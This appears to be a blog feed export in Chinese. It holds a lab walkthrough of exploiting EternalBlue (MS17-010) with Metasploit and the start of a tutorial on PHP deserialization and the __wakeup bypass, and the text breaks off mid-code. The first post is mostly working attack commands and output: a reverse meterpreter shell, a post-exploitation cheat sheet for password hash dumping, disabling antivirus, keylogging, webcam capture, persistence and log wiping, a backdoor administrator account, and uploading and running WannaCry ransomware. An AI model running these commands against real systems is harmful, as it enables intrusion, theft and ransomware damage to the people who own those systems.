src="https://img-blog.csdnimg.cn/20210322113137566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>开始复现</strong><br>1.查找漏洞</p><p>进入msf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br></code></pre></td></tr></table></figure><p>永恒之蓝漏洞编号为MS17-010</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">search ms17-010<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210309201023297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2.使用<code>use auxiliary/scanner/smb/smb_ms17_010</code>模块进行检测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf &gt; use auxiliary/scanner/smb/smb_ms17_010<br>msf auxiliary(scanner/smb/smb_ms17_010) &gt; show options<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210309201610867.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>存在漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="hljs-built_in">set</span> RHOSTS 192.168.182.131<br><br>msf auxiliary(scanner/smb/smb_ms17_010) &gt; run<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021031020033516.png" alt="在这里插入图片描述"></p><p>2.使用<code>exploit/windows/smb/ms17_010_eternalblue</code>模块进行攻击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf &gt; use exploit/windows/smb/ms17_010_eternalblue<br>msf exploit(windows/smb/ms17_010_eternalblue) &gt; show options<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210310200620174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3.配置参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">设置目标主机（靶机）<br>msf exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="hljs-built_in">set</span> RHOST 192.168.182.131<br>设置监听主机（kali）<br>msf exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="hljs-built_in">set</span> LHOST 192.168.182.130<br>设置攻击载荷<br>msf exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure><p>4.开始攻击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf exploit(windows/smb/ms17_010_eternalblue) &gt; exploit<br></code></pre></td></tr></table></figure><p>攻击成功效果如下，反弹shell<br><img src="https://img-blog.csdnimg.cn/2021031020075272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>可以看到攻击机192.168.182.130的4444端口，与靶机192.168.182.129的49159端口之间已经建立了连接。</p><p><strong>利用漏洞控制靶机</strong><br>在meterpreter &gt; 中可以使用以下的命令来控制靶机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysinfo             <span class="hljs-comment">#查看目标主机系统信息</span><br>run scraper         <span class="hljs-comment">#查看目标主机详细信息</span><br>run hashdump        <span class="hljs-comment">#导出密码的哈希</span><br>load kiwi           <span class="hljs-comment">#加载</span><br>ps                  <span class="hljs-comment">#查看目标主机进程信息</span><br><span class="hljs-built_in">pwd</span>                 <span class="hljs-comment">#查看目标当前目录(windows)</span><br>getlwd              <span class="hljs-comment">#查看目标当前目录(Linux)</span><br>search -f *.jsp -d e:\                <span class="hljs-comment">#搜索E盘中所有以.jsp为后缀的文件</span><br>download  e:\test.txt  /root          <span class="hljs-comment">#将目标机的e:\test.txt文件下载到/root目录下</span><br>upload    /root/test.txt d:\<span class="hljs-built_in">test</span>      <span class="hljs-comment">#将/root/test.txt上传到目标机的 d:\test\ 目录下getpid              #查看当前Meterpreter Shell的进程</span><br>PIDmigrate 1384     <span class="hljs-comment">#将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span><br>idletime            <span class="hljs-comment">#查看主机运行时间</span><br>getuid              <span class="hljs-comment">#查看获取的当前权限</span><br>getsystem           <span class="hljs-comment">#提权</span><br>run  killav         <span class="hljs-comment">#关闭杀毒软件</span><br>screenshot          <span class="hljs-comment">#截图</span><br>webcam_list         <span class="hljs-comment">#查看目标主机的摄像头</span><br>webcam_snap         <span class="hljs-comment">#拍照</span><br>webcam_stream       <span class="hljs-comment">#开视频</span><br>execute  参数  -f 可执行文件   <span class="hljs-comment">#执行可执行程序</span><br>run getgui -u hack -p 123    <span class="hljs-comment">#创建hack用户，密码为123</span><br>run getgui -e                <span class="hljs-comment">#开启远程桌面</span><br>keyscan_start                <span class="hljs-comment">#开启键盘记录功能</span><br>keyscan_dump                 <span class="hljs-comment">#显示捕捉到的键盘记录信息</span><br>keyscan_stop                 <span class="hljs-comment">#停止键盘记录功能</span><br>uictl  <span class="hljs-built_in">disable</span>  keyboard     <span class="hljs-comment">#禁止目标使用键盘</span><br>uictl  <span class="hljs-built_in">enable</span>   keyboard     <span class="hljs-comment">#允许目标使用键盘</span><br>uictl  <span class="hljs-built_in">disable</span>  mouse        <span class="hljs-comment">#禁止目标使用鼠标</span><br>uictl  <span class="hljs-built_in">enable</span>   mouse        <span class="hljs-comment">#允许目标使用鼠标</span><br>load                         <span class="hljs-comment">#使用扩展库</span><br>run             <span class="hljs-comment">#使用扩展库</span><br>run persistence -X -i 5 -p 8888 -r 192.168.10.27        <span class="hljs-comment">#反弹时间间隔是5s 会自动连接</span><br>                                   192.168.27的4444端口，缺点是容易被杀毒软件查杀<br>portfwd add -l 3389 -r 192.168.11.13 -p 3389     <span class="hljs-comment">#将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</span><br>clearev                       <span class="hljs-comment">#清除日志</span><br></code></pre></td></tr></table></figure><p>1.显示远程主机系统信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; sysinfo<br>Computer        : WIN-RMJMPV5HNPN<br>OS              : Windows 7 (6.1 Build 7601, Service Pack 1).<br>Architecture    : x64<br>System Language : zh_CN<br>Domain          : WORKGROUP<br>Logged On Users : 2<br>Meterpreter     : x64/windows<br></code></pre></td></tr></table></figure><p>2.查看用户身份：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; getuid<br>Server username: NT AUTHORITY\SYSTEM<br></code></pre></td></tr></table></figure><p>3.捕捉远程主机桌面：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; screenshot<br>Screenshot saved to: /home/kali/桌面/dSBqHeNN.jpeg<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210310201127132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4.进入shell权限<br><img src="https://img-blog.csdnimg.cn/2021030920270545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>往靶机里面上传文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Windows\System32&gt;<span class="hljs-built_in">cd</span> /d <span class="hljs-string">&quot;C:\Users\admin\Desktop&quot;</span><br><span class="hljs-built_in">cd</span> /d <span class="hljs-string">&quot;C:\Users\admin\Desktop&quot;</span><br><br>C:\Users\admin\Desktop&gt;<span class="hljs-built_in">echo</span> hello &gt;&gt;hello.txt<br><span class="hljs-built_in">echo</span> hello &gt;&gt;hello.txt<br></code></pre></td></tr></table></figure><p>靶机桌面出现hello.txt<br><img src="https://img-blog.csdnimg.cn/20210309204807579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>5.添加用户到管理员组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Windows\system32&gt;net user atkx 123456 /add       <br><span class="hljs-comment">#在windows 7上创建一个hack的用户，以便下次访问</span><br><br>C:\Windows\system32&gt;net localgroup administrators atkx /add    <br><span class="hljs-comment">#将hack加入到windows 7的本地管理员组中，以便获得更大权限</span><br><br>C:\Windows\system32&gt;net user        <br><span class="hljs-comment">#查看windows 7本地用户</span><br><br>C:\Windows\system32&gt;net localgroup administrators       <br><span class="hljs-comment">#查看windows 7本地管理员</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210322115653954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>6.上传WannaCry勒索病毒</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; upload /tmp/wcry.exe_ c://<br>[*] uploading  : /tmp/wcry.exe_ -&gt; c://<br>[*] uploaded   : /tmp/wcry.exe_ -&gt; c://\wcry.exe_<br></code></pre></td></tr></table></figure><p>进入shell权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; shell<br>Process 368 created.<br>Channel 2 created.<br>Microsoft Windows [�汾 6.1.7601]<br>��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����<br></code></pre></td></tr></table></figure><p>运行病毒</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Windows\system32&gt;c://wcry.exe_<br>c://wcry.exe_<br></code></pre></td></tr></table></figure><p>成功<br><img src="https://img-blog.csdnimg.cn/20210311193421574.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    
    <tags>
      
      <tag>永恒之蓝</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浅谈PHP反序列化漏洞</title>
    <link href="/posts/93176463/"/>
    <url>/posts/93176463/</url>
    
    <content type="html"><![CDATA[<h2 id="PHP序列化"><a href="#PHP序列化" class="headerlink" title="PHP序列化"></a>PHP序列化</h2><blockquote><p>序列化是将变量转换为可保存或传输的字符串的过程。</p></blockquote><p>函数  <code>serialize()</code>，可将变量转换为字符串并且在转换中保存当前变量的值。<br>序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。php允许保存一个对象方便以后重用，这个过程被称为序列化。<br>我们先建一个Test对象，存入信息，然后直接输出对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;admin&quot;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;admins&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$m</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br>    <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$m</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">Test <span class="hljs-title function_ invoke__">Object</span><br>(<br>    [id] =&gt; <span class="hljs-number">1</span><br>    [name] =&gt; admin<br>    [password] =&gt; admins<br>)<br></code></pre></td></tr></table></figure><p>这里的Object是对象的意思</p><p>在PHP中创建一个对象后，可以使用serialize()函数将对象进行序列化，转换为字符串，然后输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"> </span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>=<span class="hljs-number">1</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> =<span class="hljs-string">&quot;admin&quot;</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;admins&quot;</span>;<br> &#125;<br><span class="hljs-variable">$m</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$m</span>-&gt;id=<span class="hljs-number">2</span>;<br><span class="hljs-variable">$m</span>-&gt;name=<span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$m</span>-&gt;password=<span class="hljs-string">&quot;roots&quot;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$m</span>);<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>序列化后的结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;id&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;root&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;roots&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>分析一下输出结果：<br><img src="https://img-blog.csdnimg.cn/20201012205041836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>黑色箭头，字母O代表Object对象；如果是A，则代表Array数组。<br>黄色箭头，数字4，代表对象名称Test占4个字符。<br>橙色箭头，数字3，代表对象里面有3个变量。<br>红色箭头，字母s代表string类型，i代表int类型。<br>紫色箭头，数字2，代表变量名占2个字符。</p><h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><blockquote><p>反序列化是在适当的时候把这个字符串再转化成原来的变量使用。</p></blockquote><p><code>unserialize</code>函数可以把serialize序列化后的字符串恢复出对象。可以从已存储的表示中创建PHP的值，恢复原先被序列化的变量。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"> </span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>=<span class="hljs-number">1</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> =<span class="hljs-string">&quot;admin&quot;</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;admins&quot;</span>;<br> &#125;<br><span class="hljs-variable">$m</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><br><span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$m</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-title function_ invoke__">print_r</span> (<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">O:4:<span class="hljs-string">&quot;Test&quot;</span>:3:&#123;s:2:<span class="hljs-string">&quot;id&quot;</span>;i:1;s:4:<span class="hljs-string">&quot;name&quot;</span>;s:5:<span class="hljs-string">&quot;admin&quot;</span>;s:8:<span class="hljs-string">&quot;password&quot;</span>;s:6:<span class="hljs-string">&quot;admins&quot;</span>;&#125;Test Object<br>(<br>    [<span class="hljs-built_in">id</span>] =&gt; 1<br>    [name] =&gt; admin<br>    [password] =&gt; admins<br>)<br></code></pre></td></tr></table></figure><p><a href="https://www.w3cschool.cn/tools/index?name=unserialize">php在线反序列化工具</a><br><img src="https://img-blog.csdnimg.cn/2020101221001958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h2><p>PHP面向对象变成中，有一类函数叫做魔法函数。这些函数是以<code>__</code>开头的，依照某些规则实例化类或者调用某些函数的时候会自动调用这些magic函数，</p><p>魔法函数如下：</p><ul><li>__sleep()<br>执行serialize()函数的时候，会被调用</li><li>__wakeup()<br>苏醒函数，执行unserialize()函数的时候，会被调用</li><li> __construct()<br>构造函数，创建一个对象时会被调用，具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作 </li><li> __destruct()<br>析构函数，销毁一个对象时会被调用 ，在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</li><li>__get()<br>调出不可访问（private，protect等修饰）属性时会被调用。 </li><li>__set()<br> 修改或写入不可访问（private，protect等修饰）属性时会被调用。| </li><li> __toString()<br>类对象被当作一个字符串使用时会被调用。|</li><li>__isset()<br>对不可访问（private，protect等修饰）属性使用empty()或isset()方法时会被调用。</li><li> __unset()<br>对不可访问（private，protect等修饰）属性使用unset()方法时会被调用。</li><li>__invoke()<br>将实例化对象当作方法使用时会被调用。</li></ul><p><strong>实例</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">demo</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$test</span> =<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;__construct()&#x27;</span>;<br>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\r\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;__destruct()&#x27;</span>;<br>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\r\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;__wakeup()&#x27;</span>;<br>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\r\n&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> demo;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;执行serialize()函数,序列化对象&#x27;</span>;<br><span class="hljs-variable">$a_ser</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\r\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;执行unserialize()函数,反序列化对象&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\r\n&quot;</span>;<br><span class="hljs-variable">$a_unser</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a_ser</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;销毁对象！&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\r\n&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>运行得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"> __construct()<br>执行serialize()函数,序列化对象<br>执行unserialize()函数,反序列化对象<br>__wakeup()<br>销毁对象！<br>__destruct()<br>__destruct()<br></code></pre></td></tr></table></figure><h2 id="绕过魔法函数的反序列化漏洞"><a href="#绕过魔法函数的反序列化漏洞" class="headerlink" title="绕过魔法函数的反序列化漏洞"></a>绕过魔法函数的反序列化漏洞</h2><h3 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过__wakeup()"></a>绕过__wakeup()</h3><blockquote><p>漏洞编号： CVE-2016-7124<br>存在漏洞的版本：PHP5 &lt; 5.6.25 或 PHP7 &lt; 7.0.10</p></blockquote><p><strong>漏洞概述</strong><br> __wakeup()魔法函数被绕过,导致执行了一些非预期效果的漏洞。</p><p><strong>漏洞分析</strong></p><p>在程序执行前，<code>serialize()</code> 函数会首先检查是否存在一个魔术方法 <code>__sleep</code>。如果存在，<code>__sleep()</code>方法会先被调用， 然后才执行序列化。 这个功能可以用于清理对象，并返回一个包含对象中所有变量名称的数组。如果该方法不返回任何内容，则NULL被序列化，导致一个E_NOTICE错误。</p><p>与之相反，unserialize()会检查是否存在一个__wakeup方法如果存在，则会先调用__wakeup方法，预先准备对象数据。但是这个wakeup()是可以被绕过的__wakeup 触发于 unserilize() 调用之前, 当反序列化时的字符串所对应的对象的数目被修改,__wake 的函数就不会被调用. 并且不会重建为对象, 但是会触发其他的魔术方法比如__destruct。</p><p><strong>漏洞原理</strong></p><p>当反序列化字符串中，表示属性个数的值大于真实属性个数时，会绕过 __wakeup 函数的执行</p><p><strong>实例</strong></p><p>比如正常序列化后得到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">O:4:<span class="hljs-string">&quot;xctf&quot;</span>:1:&#123;s:4:<span class="hljs-string">&quot;flag&quot;</span>;s:3:<span class="hljs-string">&quot;111&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>将对象属性个数由真实值1修改为2，会绕过<code>__wakeup()</code> 函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;xctf&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;flag&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;111&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><h2 id="序列化参数"><a href="#序列化参数" class="headerlink" title="序列化参数"></a>序列化参数</h2><p>序列化参数有三种，分别是public、protected和private，三者在序列化时有明显的区别。</p><h3 id="public"><a href="#public" class="headerlink" title="public"></a>public</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test2</span>=<span class="hljs-string">&quot;hello&quot;</span>;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span 